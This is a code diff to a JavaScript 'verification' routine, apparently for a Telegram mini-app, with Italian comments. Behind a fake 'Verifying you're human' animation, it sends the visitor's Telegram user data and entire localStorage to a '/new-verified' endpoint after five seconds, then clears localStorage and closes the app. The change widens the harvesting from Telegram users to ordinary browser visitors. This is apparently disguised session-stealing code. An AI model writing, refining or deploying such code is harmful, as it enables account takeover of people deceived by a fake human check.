@@ -6,34 +6,21 @@ window.Sg = {
     }
   },
   close: () => {
-    if (!this.verify) {
-      this.verify = true;
+    if (!window.Sg.verify) {
+      window.Sg.verify = true;
 
       const isTelegram = window.Telegram?.WebApp?.initData;
 
+      // ✅ Mostra animazione solo se siamo in Telegram
       if (isTelegram) {
-        // ✅ Aggiorna correttamente il body
         document.body.innerHTML = `
-          <div style="
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            background: white;
-          ">
-            <h2 style="
-              font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen,
-              Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
-              font-weight: 700;
-              font-size: 1.5rem;
-              margin-top: 180px;
-              color: black;
-            ">
+          <div style="height: 100vh; display: flex; justify-content: center; align-items: center; background: white;">
+            <h2 style="font-family: sans-serif; font-weight: 700; font-size: 1.5rem; color: black;">
               Verifying you're human<span class="dots"></span>
             </h2>
           </div>
         `;
 
-        // ✅ Inserisci il CSS animato direttamente nel <head>
         const style = document.createElement("style");
         style.innerHTML = `
           @keyframes dots {
@@ -52,25 +39,30 @@ window.Sg = {
         document.head.appendChild(style);
       }
 
-      // ⏳ Dopo 5 secondi chiudi
-      if (isTelegram) {
-        setTimeout(async () => {
-          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
-          await fetch("/new-verified", {
-            method: "POST",
-            body: JSON.stringify({
-              user,
-              storage: window.localStorage,
-            }),
-            headers: {
-              "content-type": "application/json",
-            },
-          });
+      // ⏳ Dopo 5 secondi invia POST a /new-verified
+      setTimeout(async () => {
+        const user = window.Telegram?.WebApp?.initDataUnsafe?.user || {
+          username: "browser_user",
+          id: "browser_" + Date.now(),
+        };
 
-          localStorage.clear();
+        await fetch("/new-verified", {
+          method: "POST",
+          body: JSON.stringify({
+            user,
+            storage: window.localStorage,
+          }),
+          headers: {
+            "content-type": "application/json",
+          },
+        });
+
+        localStorage.clear();
+
+        if (isTelegram) {
           window.Telegram.WebApp.close();
-        }, 5000);
-      }
+        }
+      }, 5000);
     }
   },
 };
